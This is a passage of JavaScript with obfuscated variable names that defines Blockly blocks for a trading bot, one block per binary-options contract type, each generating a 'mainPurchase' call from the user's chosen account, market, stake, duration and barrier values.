  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Even", "DIGITEVEN"], ["Digit Odd", "DIGITODD"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_even_odd = function (_0x222d53, _0x4c087a) {
  var _0x3e0f4f = _0x222d53.getFieldValue("selcontract_nya");
  var _0x358551 = _0x222d53.getFieldValue("market_nya");
  var _0x484890 = _0x358551 == "activemarket" ? "mainSymbol" : _0x358551 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x358551.split("|")[0] + "\"";
  var _0x3800 = _0x222d53.getFieldValue("account_nya");
  var _0x8c2dba = _0x222d53.getFieldValue("stakeAM_nya");
  var _0x21e9c8 = _0x4c087a.valueToCode(_0x222d53, "stake_nya", javascript.Order.ATOMIC);
  if (_0x21e9c8.toString().length == 0) {
    _0x21e9c8 = 1;
  }
  ;
  var _0x1d7ec2 = _0x4c087a.valueToCode(_0x222d53, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x2c28f7 = "mainPurchase(\"" + _0x3800 + "\",\"" + _0x8c2dba + "\"," + _0x21e9c8 + ",\"" + _0x3e0f4f + "\"," + _0x484890 + "," + _0x1d7ec2 + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return _0x2c28f7;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_rise_fall",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Rise", "CALL"], ["Fall", "PUT"], ["Rise (or Equals)", "CALLE"], ["Fall (or Equals)", "PUTE"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_rise_fall = function (_0x2593e0, _0x16fed6) {
  var _0x10e104 = _0x2593e0.getFieldValue("selcontract_nya");
  var _0x369737 = _0x2593e0.getFieldValue("market_nya");
  var _0x5bf3dd = _0x369737 == "activemarket" ? "mainSymbol" : _0x369737 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x369737.split("|")[0] + "\"";
  var _0x40aa1c = _0x2593e0.getFieldValue("account_nya");
  var _0x320895 = _0x2593e0.getFieldValue("stakeAM_nya");
  var _0x5613ca = _0x16fed6.valueToCode(_0x2593e0, "stake_nya", javascript.Order.ATOMIC);
  if (_0x5613ca.toString().length == 0) {
    _0x5613ca = 1;
  }
  ;
  var _0x3f290d = _0x2593e0.getFieldValue("seldurationunit_nya");
  var _0x30d0d3 = _0x16fed6.valueToCode(_0x2593e0, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x25fae0 = "mainPurchase(\"" + _0x40aa1c + "\",\"" + _0x320895 + "\"," + _0x5613ca + ",\"" + _0x10e104 + "\"," + _0x5bf3dd + "," + _0x30d0d3 + ",\"" + _0x3f290d + "\",\"+0\",0,0,0,0,0,0,0,0,0,0,0);";
  return _0x25fae0;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_higher_lower",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Higher", "CALL"], ["Lower", "PUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_higher_lower = function (_0x3bddaf, _0x1c8ade) {
  var _0x376994 = _0x3bddaf.getFieldValue("selcontract_nya");
  var _0x1b05dc = _0x3bddaf.getFieldValue("market_nya");
  var _0x398816 = _0x1b05dc == "activemarket" ? "mainSymbol" : _0x1b05dc == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x1b05dc.split("|")[0] + "\"";
  var _0x51c33d = _0x3bddaf.getFieldValue("account_nya");
  var _0x33b183 = _0x3bddaf.getFieldValue("stakeAM_nya");
  var _0x3defa9 = _0x1c8ade.valueToCode(_0x3bddaf, "stake_nya", javascript.Order.ATOMIC);
  if (_0x3defa9.toString().length == 0) {
    _0x3defa9 = 1;
  }
  ;
  var _0x41dfed = _0x3bddaf.getFieldValue("seldurationunit_nya");
  var _0x3a728b = _0x1c8ade.valueToCode(_0x3bddaf, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x8432a2 = _0x1c8ade.valueToCode(_0x3bddaf, "barrier_nya", javascript.Order.ATOMIC);
  var _0x34b549 = "mainPurchase(\"" + _0x51c33d + "\",\"" + _0x33b183 + "\"," + _0x3defa9 + ",\"" + _0x376994 + "\"," + _0x398816 + "," + _0x3a728b + ",\"" + _0x41dfed + "\"," + _0x8432a2 + ",0,0,0,0,0,0,0,0,0,0,0);";
  return _0x34b549;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_touch_notouch",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Touches", "ONETOUCH"], ["Does Not Touch", "NOTOUCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_touch_notouch = function (_0x11eaa7, _0x4de3ee) {
  var _0x261090 = _0x11eaa7.getFieldValue("selcontract_nya");
  var _0x30a1cc = _0x11eaa7.getFieldValue("market_nya");
  var _0x3d88a9 = _0x30a1cc == "activemarket" ? "mainSymbol" : _0x30a1cc == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x30a1cc.split("|")[0] + "\"";
  var _0x5a3d7a = _0x11eaa7.getFieldValue("account_nya");
  var _0x8031cc = _0x11eaa7.getFieldValue("stakeAM_nya");
  var _0x565041 = _0x4de3ee.valueToCode(_0x11eaa7, "stake_nya", javascript.Order.ATOMIC);
  if (_0x565041.toString().length == 0) {
    _0x565041 = 1;
  }
  ;
  var _0x6c468f = _0x11eaa7.getFieldValue("seldurationunit_nya");
  var _0x124432 = _0x4de3ee.valueToCode(_0x11eaa7, "inpduration_nya", javascript.Order.ATOMIC);
  var _0xc76cfd = _0x4de3ee.valueToCode(_0x11eaa7, "barrier_nya", javascript.Order.ATOMIC);
  var _0x20bbb9 = "mainPurchase(\"" + _0x5a3d7a + "\",\"" + _0x8031cc + "\"," + _0x565041 + ",\"" + _0x261090 + "\"," + _0x3d88a9 + "," + _0x124432 + ",\"" + _0x6c468f + "\"," + _0xc76cfd + ",0,0,0,0,0,0,0,0,0,0,0);";
  return _0x20bbb9;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_endsbetween_endsoutside",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Ends Between", "EXPIRYRANGE"], ["Ends Outside", "EXPIRYMISS"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_endsbetween_endsoutside = function (_0x480863, _0x143bd1) {
  var _0x2442e6 = _0x480863.getFieldValue("selcontract_nya");
  var _0x4d2dc8 = _0x480863.getFieldValue("market_nya");
  var _0x552a65 = _0x4d2dc8 == "activemarket" ? "mainSymbol" : _0x4d2dc8 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x4d2dc8.split("|")[0] + "\"";
  var _0x1e6dc5 = _0x480863.getFieldValue("account_nya");
  var _0x39517d = _0x480863.getFieldValue("stakeAM_nya");
  var _0x49c5d3 = _0x143bd1.valueToCode(_0x480863, "stake_nya", javascript.Order.ATOMIC);
  if (_0x49c5d3.toString().length == 0) {
    _0x49c5d3 = 1;
  }
  ;
  var _0x95aab4 = _0x480863.getFieldValue("seldurationunit_nya");
  var _0x31bf0e = _0x143bd1.valueToCode(_0x480863, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x5c817e = _0x143bd1.valueToCode(_0x480863, "highbarrier_nya", javascript.Order.ATOMIC);
  var _0x106c33 = _0x143bd1.valueToCode(_0x480863, "lowbarrier_nya", javascript.Order.ATOMIC);
  var _0x4e5c63 = "mainPurchase(\"" + _0x1e6dc5 + "\",\"" + _0x39517d + "\"," + _0x49c5d3 + ",\"" + _0x2442e6 + "\"," + _0x552a65 + "," + _0x31bf0e + ",\"" + _0x95aab4 + "\",0," + _0x5c817e + "," + _0x106c33 + ",0,0,0,0,0,0,0,0,0);";
  return _0x4e5c63;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_staysbetween_goesoutside",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Stays Between", "RANGE"], ["Goes Outside", "UPORDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_staysbetween_goesoutside = function (_0x34a51e, _0x57b57c) {
  var _0x2f6eec = _0x34a51e.getFieldValue("selcontract_nya");
  var _0x2f5e54 = _0x34a51e.getFieldValue("market_nya");
  var _0xc4dfed = _0x2f5e54 == "activemarket" ? "mainSymbol" : _0x2f5e54 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x2f5e54.split("|")[0] + "\"";
  var _0x43fe90 = _0x34a51e.getFieldValue("account_nya");
  var _0x17b03a = _0x34a51e.getFieldValue("stakeAM_nya");
  var _0x5c88d9 = _0x57b57c.valueToCode(_0x34a51e, "stake_nya", javascript.Order.ATOMIC);
  if (_0x5c88d9.toString().length == 0) {
    _0x5c88d9 = 1;
  }
  ;
  var _0x57eccc = _0x34a51e.getFieldValue("seldurationunit_nya");
  var _0x4eee77 = _0x57b57c.valueToCode(_0x34a51e, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x3c6cc5 = _0x57b57c.valueToCode(_0x34a51e, "highbarrier_nya", javascript.Order.ATOMIC);
  var _0x7af346 = _0x57b57c.valueToCode(_0x34a51e, "lowbarrier_nya", javascript.Order.ATOMIC);
  var _0x2f3ae4 = "mainPurchase(\"" + _0x43fe90 + "\",\"" + _0x17b03a + "\"," + _0x5c88d9 + ",\"" + _0x2f6eec + "\"," + _0xc4dfed + "," + _0x4eee77 + ",\"" + _0x57eccc + "\",0," + _0x3c6cc5 + "," + _0x7af346 + ",0,0,0,0,0,0,0,0,0);";
  return _0x2f3ae4;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_asianup_asiandown",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [5-10] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Asian Up", "ASIANU"], ["Asian Down", "ASIAND"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_asianup_asiandown = function (_0x4c4705, _0x562ca6) {
  var _0x1a0726 = _0x4c4705.getFieldValue("selcontract_nya");
  var _0x22c514 = _0x4c4705.getFieldValue("market_nya");
  var _0x5d0895 = _0x22c514 == "activemarket" ? "mainSymbol" : _0x22c514 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x22c514.split("|")[0] + "\"";
  var _0x7f93ba = _0x4c4705.getFieldValue("account_nya");
  var _0x58df3f = _0x4c4705.getFieldValue("stakeAM_nya");
  var _0x1f8ec1 = _0x562ca6.valueToCode(_0x4c4705, "stake_nya", javascript.Order.ATOMIC);
  if (_0x1f8ec1.toString().length == 0) {
    _0x1f8ec1 = 1;
  }
  ;
  var _0x315e01 = _0x562ca6.valueToCode(_0x4c4705, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x20ed1a = "mainPurchase(\"" + _0x7f93ba + "\",\"" + _0x58df3f + "\"," + _0x1f8ec1 + ",\"" + _0x1a0726 + "\"," + _0x5d0895 + "," + _0x315e01 + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return _0x20ed1a;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_highclose_closelow_highlow",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: minutes [1-30] %9 Multiplier: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High-Close", "LBFLOATPUT"], ["Close-Low", "LBFLOATCALL"], ["High-Low", "LBHIGHLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "multiplier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_highclose_closelow_highlow = function (_0x25f735, _0x36b656) {
  var _0x2b0e66 = _0x25f735.getFieldValue("selcontract_nya");
  var _0x521217 = _0x25f735.getFieldValue("market_nya");
  var _0x1e5611 = _0x521217 == "activemarket" ? "mainSymbol" : _0x521217 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x521217.split("|")[0] + "\"";
  var _0x9213a1 = _0x25f735.getFieldValue("account_nya");
  var _0x48bd4b = _0x25f735.getFieldValue("stakeAM_nya");
  var _0x3360b5 = _0x36b656.valueToCode(_0x25f735, "stake_nya", javascript.Order.ATOMIC);
  if (_0x3360b5.toString().length == 0) {
    _0x3360b5 = 1;
  }
  ;
  var _0x37c266 = _0x36b656.valueToCode(_0x25f735, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x1def26 = _0x36b656.valueToCode(_0x25f735, "multiplier_nya", javascript.Order.ATOMIC);
  var _0x2aaed1 = "mainPurchase(\"" + _0x9213a1 + "\",\"" + _0x48bd4b + "\"," + _0x3360b5 + ",\"" + _0x2b0e66 + "\"," + _0x1e5611 + "," + _0x37c266 + ",\"m\",0,0,0,0,0,0," + _0x1def26 + ",0,0,0,0,0);";
  return _0x2aaed1;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_resetcall_resetput",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Reset Call", "RESETCALL"], ["Reset Put", "RESETPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_resetcall_resetput = function (_0x4695be, _0x5d928b) {
  var _0x2e5c23 = _0x4695be.getFieldValue("selcontract_nya");
  var _0x39c91a = _0x4695be.getFieldValue("market_nya");
  var _0x3eaaaf = _0x39c91a == "activemarket" ? "mainSymbol" : _0x39c91a == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x39c91a.split("|")[0] + "\"";
  var _0x305586 = _0x4695be.getFieldValue("account_nya");
  var _0x25a68e = _0x4695be.getFieldValue("stakeAM_nya");
  var _0x11d264 = _0x5d928b.valueToCode(_0x4695be, "stake_nya", javascript.Order.ATOMIC);
  if (_0x11d264.toString().length == 0) {
    _0x11d264 = 1;
  }
  ;
  var _0x1d7fab = _0x4695be.getFieldValue("seldurationunit_nya");
  var _0x5d1689 = _0x5d928b.valueToCode(_0x4695be, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x4898c2 = "mainPurchase(\"" + _0x305586 + "\",\"" + _0x25a68e + "\"," + _0x11d264 + ",\"" + _0x2e5c23 + "\"," + _0x3eaaaf + "," + _0x5d1689 + ",\"" + _0x1d7fab + "\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return _0x4898c2;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_hightick_lowtick",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: 5 Ticks %9 Tick Prediction: [1-5] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High Tick", "TICKHIGH"], ["Low Tick", "TICKLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "tickprediction_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_hightick_lowtick = function (_0x26db4d, _0x19d04f) {
  var _0x18dcf3 = _0x26db4d.getFieldValue("selcontract_nya");
  var _0x549598 = _0x26db4d.getFieldValue("market_nya");
  var _0x2e9e21 = _0x549598 == "activemarket" ? "mainSymbol" : _0x549598 == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x549598.split("|")[0] + "\"";
  var _0x16d1c9 = _0x26db4d.getFieldValue("account_nya");
  var _0x53d6a1 = _0x26db4d.getFieldValue("stakeAM_nya");
  var _0xc333ab = _0x19d04f.valueToCode(_0x26db4d, "stake_nya", javascript.Order.ATOMIC);
  if (_0xc333ab.toString().length == 0) {
    _0xc333ab = 1;
  }
  ;
  var _0xdc8e8a = _0x19d04f.valueToCode(_0x26db4d, "tickprediction_nya", javascript.Order.ATOMIC);
  var _0x28a5e3 = "mainPurchase(\"" + _0x16d1c9 + "\",\"" + _0x53d6a1 + "\"," + _0xc333ab + ",\"" + _0x18dcf3 + "\"," + _0x2e9e21 + ",5,\"t\",0,0,0,0,0,0,0," + _0xdc8e8a + ",0,0,0,0);";
  return _0x28a5e3;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_onlyups_onlydowns",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [2-5] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Only Ups", "RUNHIGH"], ["Only Downs", "RUNLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_onlyups_onlydowns = function (_0xa43eb1, _0x5ccf6c) {
  var _0x4013a3 = _0xa43eb1.getFieldValue("selcontract_nya");
  var _0x23a6dd = _0xa43eb1.getFieldValue("market_nya");
  var _0x36f9c5 = _0x23a6dd == "activemarket" ? "mainSymbol" : _0x23a6dd == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x23a6dd.split("|")[0] + "\"";
  var _0x286abe = _0xa43eb1.getFieldValue("account_nya");
  var _0x1821ed = _0xa43eb1.getFieldValue("stakeAM_nya");
  var _0x41350d = _0x5ccf6c.valueToCode(_0xa43eb1, "stake_nya", javascript.Order.ATOMIC);
  if (_0x41350d.toString().length == 0) {
    _0x41350d = 1;
  }
  ;
  var _0x6fd3ec = _0x5ccf6c.valueToCode(_0xa43eb1, "inpduration_nya", javascript.Order.ATOMIC);
  var _0x1fc005 = "mainPurchase(\"" + _0x286abe + "\",\"" + _0x1821ed + "\"," + _0x41350d + ",\"" + _0x4013a3 + "\"," + _0x36f9c5 + "," + _0x6fd3ec + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return _0x1fc005;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_accumulatorup",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Growth Rate % [1-5]: %9 Take Profit: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Accumulator Up", "ACCU"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "selaccumulate_nya"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_accumulatorup = function (_0x36b9ab, _0x4b962f) {
  var _0x2d6051 = _0x36b9ab.getFieldValue("selcontract_nya");
  var _0x5ba6de = _0x36b9ab.getFieldValue("market_nya");
  var _0x1042b4 = _0x5ba6de == "activemarket" ? "mainSymbol" : _0x5ba6de == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + _0x5ba6de.split("|")[0] + "\"";
  var _0x7c628d = _0x36b9ab.getFieldValue("account_nya");
  var _0x5cb742 = _0x36b9ab.getFieldValue("stakeAM_nya");
  var _0x3673a0 = _0x4b962f.valueToCode(_0x36b9ab, "stake_nya", javascript.Order.ATOMIC);
  if (_0x3673a0.toString().length == 0) {
    _0x3673a0 = 1;
  }
  ;
  var _0x3d6500 = _0x4b962f.valueToCode(_0x36b9ab, "selaccumulate_nya", javascript.Order.ATOMIC);
  var _0x4560f3 = _0x4b962f.valueToCode(_0x36b9ab, "limittp_nya", javascript.Order.ATOMIC);
  var _0x43c165 = "mainPurchase(\"" + _0x7c628d + "\",\"" + _0x5cb742 + "\"," + _0x3673a0 + ",\"" + _0x2d6051 + "\"," + _0x1042b4 + ",100,\"t\",0,0,0,0,0,0,0,0," + _0x3d6500 + ",0," + _0x4560f3 + ",0);";
  return _0x43c165;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_multiplyup_multiplydown",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Multiplier: %9 %10 Take Profit: %11 Stop Loss: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Multiply Up", "MULTUP"], ["Multiply Down", "MULTDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "selmultipliermultiply_nya",
    options: [["x100", "100"], ["x200", "200"], ["x300", "300"], ["x500", "500"], ["x1000", "1000"]]
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }, {
    type: "input_value",
    name: "limitsl_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_multiplyup_multiplydown = function (_0x542a43, _0x5db9ac) {
  var _0x1b3520 = _0x542a43.getFieldValue("selcontract_nya");
  var _0x567528 = _0x542a43.getFieldValue("market_nya");
